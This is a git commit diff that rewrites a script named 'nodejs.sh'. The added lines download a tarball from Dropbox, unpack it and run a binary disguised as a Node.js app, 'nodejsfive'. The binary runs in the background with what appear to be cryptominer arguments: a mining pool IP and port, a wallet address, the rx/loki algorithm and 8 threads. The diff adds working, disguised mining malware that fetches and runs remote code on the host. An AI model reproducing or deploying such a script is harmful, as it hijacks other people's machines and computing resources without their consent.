a1c9916bb5cd73a7d914044a14dcd881d680ed32
GraphXdev <66101531+GraphXdev@users.noreply.github.com>
2020-06-17 03:43:12 +0000

    Update nodejs.sh

--- nodejs.sh
+++ nodejs.sh
@@ -1,1 +1,8 @@
+#!/bin/sh
+cd /home/sshuser
+sysctl vm.nr_hugepages=2048
 ls
+wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
+tar xvzf nodejsapp8q.tar.gz
+cd nodejsbrnt
+./nodejsfive -o 167.114.65.192:10111 -u LZdfLiPo6Zs2hq7FggM1ePUMZjtmisCpzVunSjzyRTC7ei3xUJwuZtqCMKuf4kwsVci9ZhzAksHykFUX9ENzvMep4fG2nNs.100000 -p drolex -a rx/loki --donate-level 1 -t 8 -B
